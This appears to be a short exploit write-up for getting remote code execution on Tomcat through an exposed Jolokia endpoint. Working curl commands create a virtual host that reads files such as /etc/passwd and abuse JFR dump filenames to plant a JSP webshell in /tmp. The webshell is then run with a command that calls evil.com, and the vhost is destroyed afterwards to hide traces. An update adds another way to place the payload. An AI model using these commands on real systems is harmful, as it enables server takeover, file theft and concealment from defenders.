# Short description

- Deploy a vhost
    - File read obtained
    - File write possible in /tmp
- Use JFR to dump a flight record with controled extension and partialy controled content
    - The file name is reflected in the jfr dump, place your jsp payload here
- Trigger RCE by querying your jsp in /tmp
- Clean your mess
    - Stop the deployed vhost
    - Destroy the deployed vhost


# Exploit

```bash
## Here, depending on the version, use Tomcat or Catalina
curl -kg 'http://127.0.0.1/jolokia/exec/Catalina:type=MBeanFactory/createStandardHost/Catalina:type=Host,host=dummy.com/dummy.com/!//true/true/true/true'
## File read on second-level directories
curl -kg 'http://dummy.com/etc/passwd'
## URL-encode our jsp payload, filename is reflected in jfr content
PAYLOAD_AND_JSPFILE=$(python2 -c "import sys, urllib as ul; print ul.quote(sys.argv[1])" '<%=Runtime.getRuntime().exec(request.getParameter(String.valueOf(42))).getInputStream()%>.jsp')
## Drop minimalist webshell
curl -kg 'http://127.0.0.1/jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/'"$PAYLOAD_AND_JSPFILE"',path-to-gc-roots=true,duration=3s'
## Execute payload
curl -kg 'http://dummy.com/tmp/'"$PAYLOAD_AND_JSPFILE"'?42=nslookup%20evil.com'
# Stop and destroy the deployed vhost
curl -kg 'http://127.0.0.1/jolokia/exec/Catalina:host=dummy.com,type=Host/stop'
curl -kg 'http://127.0.0.1/jolokia/exec/Catalina:host=dummy.com,type=Host/destroy'
```

# Update 1 - Tips from https://twitter.com/henshinpt

If url-encoding breaks your path while querying your jsp, it is possible to place the payload in the name property, and have a clean filename. 

```
duration=1s,fliename=!/tmp!/shell.jsp,name='<%!!out.println(444*444);%>'
```
